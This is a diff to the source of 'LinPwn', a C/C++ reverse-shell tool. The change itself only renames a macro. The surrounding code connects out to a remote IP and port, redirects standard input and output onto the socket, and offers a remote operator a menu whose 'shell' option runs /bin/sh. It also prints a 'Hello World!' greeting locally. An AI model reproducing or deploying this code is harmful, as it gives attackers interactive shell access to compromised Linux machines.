@@ -10,11 +10,11 @@
 #include <sys/types.h>
 
 #define BUFFER 20
-#define FD 0
+#define SD 0
 
 
 void get_input(char *option) {
-  write(FD, "\x1b[31m>>> \0", 10);
+  write(SD, "\x1b[31m>>> \0", 10);
   fgets(option, 20, stdin);
 
   for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
@@ -37,7 +37,7 @@ class Connection {
     address.sin_addr.s_addr = inet_addr(ip);
     address.sin_port = htons(port);
     connect(connecting, (struct sockaddr *)&address, sizeof(address));
-    dup2(connecting, FD);
+    dup2(connecting, SD);
     dup2(connecting, 1);
   }
 };
@@ -45,20 +45,20 @@ class Connection {
 
 struct Commands {
   void help() {
-    write(FD, "\x1b[32mOptions: \n\0", 15);
-    write(FD, "1. shell\n\0", 10);
-    write(FD, "2. exit\n\0", 10);
+    write(SD, "\x1b[32mOptions: \n\0", 15);
+    write(SD, "1. shell\n\0", 10);
+    write(SD, "2. exit\n\0", 10);
   }
 
 
   void shell() {
-    write(FD, "\x1b[32mExecuting /bin/sh\n\0", 25);
+    write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
     system("/bin/sh");
   }
 
 
   void quit() {
-    write(FD, "\x1b[33mClosing connection...\n\0", 28);
+    write(SD, "\x1b[33mClosing connection...\n\0", 28);
   }
 };
 
@@ -78,7 +78,7 @@ int handler() {
   } else if (strncmp(option, "", 1) == 0) {
     return 0;
   } else {
-    write(FD, "\x1b[33mNot a valid option\n\0", 25);
+    write(SD, "\x1b[33mNot a valid option\n\0", 25);
   }
 
   return 0;
@@ -89,8 +89,8 @@ int main() {
   Connection connection;
   connection.connection_open();
   write(2, "\x1b[32mHello World!\n\0", 20);
-  write(FD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
-  write(FD, "Type help to list commands.\n\0", 28);
+  write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
+  write(SD, "Type help to list commands.\n\0", 28);
 
   for (;;) {
     if (handler() == 1) break;
